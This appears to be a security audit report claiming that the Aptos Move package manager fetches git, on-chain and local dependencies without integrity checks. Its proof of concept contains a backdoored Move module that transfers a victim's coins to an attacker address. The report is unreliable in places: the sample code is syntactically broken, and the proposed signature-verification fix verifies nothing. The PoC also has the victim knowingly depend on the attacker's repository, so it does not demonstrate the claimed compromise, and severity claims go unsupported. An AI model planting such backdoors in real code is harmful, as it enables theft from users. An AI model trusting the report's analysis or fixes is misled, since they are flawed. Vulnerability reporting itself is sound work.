# Audit Report

## Title
Missing Integrity Verification for Move Package Dependencies Enables Supply Chain Attacks

## Summary
The Move package dependency system lacks cryptographic integrity verification (signatures or content hashes) for dependencies fetched from git, local, and on-chain sources. This allows attackers to inject malicious code through compromised dependency sources, enabling supply chain attacks that could lead to fund theft, consensus divergence, or smart contract vulnerabilities.

## Finding Description

The Move package system fetches dependencies from three sources without performing integrity verification:

**1. Git Dependencies** - The `PackageCache::clone_or_update_git_repo()` function uses libgit2 to clone repositories without verifying GPG signatures or commit signatures: [1](#0-0) 

The dependency specification in the manifest contains no hash or signature fields: [2](#0-1) 

**2. On-Chain Dependencies** - The `fetch_on_chain_package()` function explicitly acknowledges the missing verification via TODO comment: [3](#0-2) 

No hash verification is performed when downloading bytecode modules from the REST API: [4](#0-3) 

**3. Local Dependencies** - No verification whatsoever is performed for local file paths: [5](#0-4) 

The `PackageLock` only stores git commit IDs and ledger versions, not content hashes for verification: [6](#0-5) 

**Attack Scenarios:**

1. **Git Server Compromise/MITM**: Attacker intercepts `git clone` or `git fetch` operations and injects malicious Move modules. Since no signature verification is performed, the malicious code is accepted.

2. **REST API Compromise**: For on-chain dependencies, if the full-node REST API endpoint is compromised or MITM'd, malicious bytecode modules are downloaded and cached without verification.

3. **Framework Rebuild Scenario**: If validators need to rebuild the Aptos Framework from source using dependencies, different nodes fetching at different times from a compromised source could end up with different bytecode, violating the **Deterministic Execution** invariant.

4. **Developer Smart Contract Compromise**: Developers building smart contracts with compromised dependencies unknowingly include malicious code that executes on-chain, enabling fund theft from contract users.

## Impact Explanation

This vulnerability qualifies as **HIGH severity** per the Aptos bug bounty criteria:

**Primary Impact - Supply Chain Attacks:**
- Enables injection of malicious code into Move smart contracts through compromised dependencies
- Could lead to **Loss of Funds** when malicious contracts are deployed and executed
- Affects the entire Move development ecosystem, not just individual developers

**Secondary Impact - Potential Consensus Violations:**
- If framework packages or validator software dependencies are compromised during a rebuild scenario, different validators could execute different bytecode
- Violates the **Deterministic Execution** invariant (Invariant #1): "All validators must produce identical state roots for identical blocks"
- Could cause **non-recoverable network partition** requiring coordinated recovery

**Tertiary Impact - Move VM Safety:**
- Malicious dependencies could include bytecode that exploits VM vulnerabilities or bypasses gas limits
- Violates **Move VM Safety** (Invariant #3)

## Likelihood Explanation

**Likelihood: MEDIUM-HIGH**

**Factors Increasing Likelihood:**
1. **MITM Attacks**: Network-level attackers can intercept unencrypted git:// protocols or compromise TLS
2. **Git Server Compromise**: Attackers regularly compromise open-source repositories (real-world examples: event-stream, ua-parser-js npm attacks)
3. **REST API Compromise**: Full-node APIs can be compromised, especially for developers using third-party nodes
4. **No Defense in Depth**: Complete absence of integrity verification makes exploitation trivial once any source is compromised
5. **Acknowledged Issue**: The TODO comment at line 302 indicates developers recognize the gap but haven't implemented protection

**Factors Moderating Likelihood:**
1. Git commit hashes provide some integrity via SHA-1 (though this is cryptographically weak)
2. Production validators typically use pre-built binaries rather than building from source dependencies
3. Requires attacker to compromise specific dependency sources

However, the **complete absence** of any integrity verification mechanism makes this a realistic attack vector, especially for the growing Move smart contract ecosystem.

## Recommendation

Implement cryptographic integrity verification for all dependency types:

**1. Add Hash Fields to Dependency Specification:**

```rust
// In move-package-manifest/src/manifest.rs
pub enum PackageLocation {
    Local { 
        path: PathBuf,
        // Add optional content hash
        hash: Option<String>,
    },
    Git {
        url: Url,
        rev: Option<String>,
        subdir: Option<String>,
        // Add commit hash verification
        commit_hash: Option<String>,
        // Add optional GPG signature verification
        verify_signature: Option<bool>,
    },
    Aptos {
        node_url: String,
        package_addr: AccountAddress,
        // Add module bytecode hashes
        module_hashes: Option<BTreeMap<String, String>>,
    },
}
```

**2. Store Content Hashes in Lock File:**

```rust
// In move-package-resolver/src/lock.rs
pub struct PackageLock {
    git: BTreeMap<String, GitDependencyInfo>,
    on_chain: BTreeMap<String, OnChainDependencyInfo>,
}

pub struct GitDependencyInfo {
    commit_id: String,
    content_hash: String, // SHA-256 of package contents
}

pub struct OnChainDependencyInfo {
    version: u64,
    module_hashes: BTreeMap<String, String>, // module_name -> SHA-256
}
```

**3. Implement Verification in PackageCache:**

```rust
// In package_cache.rs, replace TODO at line 302-304:
if cached_package_path.exists() {
    // Verify integrity of cached package
    if let Some(expected_hashes) = &module_hashes {
        verify_module_hashes(&cached_package_path, expected_hashes)?;
    }
    return Ok(cached_package_path);
}

// Add verification after download at line 399:
if let Some(expected_hashes) = &module_hashes {
    verify_module_hashes(&cached_package_path, expected_hashes)?;
}
```

**4. Enable GPG Signature Verification for Git:**

```rust
// In clone_or_update_git_repo, add:
let mut fetch_options = FetchOptions::new();
// Enable signature verification if requested
if verify_signature {
    // Configure libgit2 to verify GPG signatures
    repo.set_config("gpg.format", "openpgp")?;
}
```

## Proof of Concept

**Scenario: Compromised Git Dependency**

```bash
# 1. Attacker sets up malicious git server or MITM's legitimate one
git clone https://github.com/attacker/malicious-move-lib.git
cd malicious-move-lib
# Add malicious Move code that steals funds
cat > sources/Malicious.move << 'EOF'
module attacker::Malicious {
    use aptos_framework::coin;
    use aptos_framework::aptos_coin::AptosCoin;
    
    // Backdoor function that transfers funds to attacker
    public fun "innocent_helper"(victim: &signer, amount: u64) {
        coin::transfer<AptosCoin>(victim, @attacker_address, amount);
    }
}
EOF
git add . && git commit -m "Add helpful utilities"

# 2. Victim's Move.toml declares the dependency
cat > Move.toml << 'EOF'
[package]
name = "VictimContract"
version = "1.0.0"

[dependencies]
MaliciousLib = { git = "https://github.com/attacker/malicious-move-lib.git", rev = "main" }
EOF

# 3. Victim builds their contract - no integrity checks performed
aptos move compile

# 4. Malicious code is now compiled into victim's contract
# 5. When deployed and executed, the malicious code can steal funds
# 6. No verification occurs at any stage to detect the compromised dependency
```

**Demonstration of Missing Verification:** [7](#0-6) 

The `FetchOptions` are configured only with progress callbacks, no signature verification is enabled. An attacker controlling the git server or performing MITM can serve arbitrary malicious code without detection.

---

## Notes

This vulnerability affects the entire Move development ecosystem. While validators in production typically use pre-built binaries, the absence of integrity verification creates significant risk for:

1. **Smart contract developers** who could unknowingly compile malicious dependencies into their contracts
2. **Framework upgrades** where rebuilding from source dependencies could introduce compromised code
3. **Development and testing environments** where dependencies are frequently fetched
4. **Supply chain security** for the broader Aptos ecosystem

The explicit TODO comment at line 302-304 confirms the development team is aware of this gap, making it a known but unaddressed security issue.

### Citations

**File:** third_party/move/tools/move-package-cache/src/package_cache.rs (L93-178)
```rust
    async fn clone_or_update_git_repo(&self, git_url: &Url) -> Result<ActiveRepository>
    where
        L: PackageCacheListener,
    {
        let repo_dir_name = percent_encode_for_filename(&CanonicalGitIdentity::new(git_url)?);
        let repos_path = self.root.join("git").join("repos");
        let repo_path = repos_path.join(&repo_dir_name);

        println!("{}", repo_path.display());

        // First, acquire a file lock to ensure exclusive write access to the cached repo.
        let lock_path = repo_path.with_extension("lock");

        fs::create_dir_all(&repos_path)?;
        let file_lock =
            FileLock::lock_with_alert_on_wait(&lock_path, Duration::from_millis(1000), || {
                self.listener.on_file_lock_wait(&lock_path);
            })
            .await?;

        // Next, ensure that we have an up-to-date clone of the repo locally.
        //
        // Before performing the actual operation, we need to configure the fetch options
        // (shared by both clone and update).
        let mut cbs = RemoteCallbacks::new();
        let mut received = 0;
        cbs.transfer_progress(move |stats| {
            let received_new = stats.received_objects();

            if received_new != received {
                received = received_new;

                self.listener.on_repo_receive_object(
                    git_url.as_str(),
                    stats.received_objects(),
                    stats.total_objects(),
                );
            }

            true
        });
        let mut fetch_options = FetchOptions::new();
        fetch_options.remote_callbacks(cbs);

        let repo = if repo_path.exists() {
            // If the repo already exists, update it.
            self.listener.on_repo_update_start(git_url.as_str());

            let repo = Repository::open_bare(&repo_path)?;
            {
                let mut remote = repo.find_remote("origin")?;
                // Fetch all remote branches and map them to local remote-tracking branches
                // - refs/heads/*: fetch all remote branches
                // - refs/remotes/origin/*: store them as local remote-tracking branches under origin/
                remote
                    .fetch(
                        &["refs/heads/*:refs/remotes/origin/*"],
                        Some(&mut fetch_options),
                        None,
                    )
                    .map_err(|err| anyhow!("Failed to update git repo at {}: {}", git_url, err))?;
            }

            self.listener.on_repo_update_complete(git_url.as_str());

            repo
        } else {
            // If the repo does not exist, clone it.
            let mut repo_builder = RepoBuilder::new();
            repo_builder.fetch_options(fetch_options);
            repo_builder.bare(true);

            self.listener.on_repo_clone_start(git_url.as_str());
            let repo = repo_builder
                .clone(git_url.as_str(), &repo_path)
                .map_err(|err| anyhow!("Failed to clone git repo at {}: {}", git_url, err))?;
            self.listener.on_repo_clone_complete(git_url.as_str());

            repo
        };

        Ok(ActiveRepository {
            repo,
            lock: file_lock,
        })
    }
```

**File:** third_party/move/tools/move-package-cache/src/package_cache.rs (L300-305)
```rust
        // If the package directory already exists, assume it has been cached.
        if cached_package_path.exists() {
            // TODO: In the future, consider verifying data integrity,
            //       e.g. hash of metadata or full contents.
            return Ok(cached_package_path);
        }
```

**File:** third_party/move/tools/move-package-cache/src/package_cache.rs (L366-397)
```rust
        let fetch_futures = package.modules.iter().map(|module| {
            let client = client.clone();
            let temp_path = temp.path().to_owned();
            let package_name = package_name.to_string();
            let module_name = module.name.clone();

            async move {
                let module_bytes = client
                    .get_account_module_bcs_at_version(address, &module_name, network_version)
                    .await?
                    .into_inner();

                let module_file_path = temp_path.join(&module_name).with_extension("mv");

                // Use blocking file write in spawn_blocking to avoid blocking the async runtime
                tokio::task::spawn_blocking(move || {
                    fs::create_dir_all(module_file_path.parent().unwrap())?;
                    let mut file = File::create(&module_file_path)?;
                    file.write_all(&module_bytes)?;
                    Ok::<(), std::io::Error>(())
                })
                .await??;

                // Notify listener after writing
                self.listener.on_bytecode_package_receive_module(
                    address,
                    &package_name,
                    &module_name,
                );
                Ok::<(), anyhow::Error>(())
            }
        });
```

**File:** third_party/move/tools/move-package-manifest/src/manifest.rs (L131-140)
```rust
    /// Refers to a package stored in a git repository.
    Git {
        /// URL to the Git repository.
        url: Url,
        /// Optional Git revision to pin the dependency to.
        /// This can be a commit hash, a branch name or a tag name.
        rev: Option<String>,
        /// Optional subdirectory within the Git repository.
        subdir: Option<String>,
    },
```

**File:** third_party/move/tools/move-package-resolver/src/resolver.rs (L204-204)
```rust
        SourceLocation::Local { path } => (**path).clone(),
```

**File:** third_party/move/tools/move-package-resolver/src/lock.rs (L17-26)
```rust
/// Represents the package lock, which stores resolved identities of git branches and network versions.
/// This ensures reproducible builds by pinning dependencies to specific commits or network versions.
#[derive(Serialize, Deserialize)]
pub struct PackageLock {
    // git_identity (stringified) -> commit_id
    git: BTreeMap<String, String>,

    // node_identity (stringified) -> version
    on_chain: BTreeMap<String, u64>,
}
```
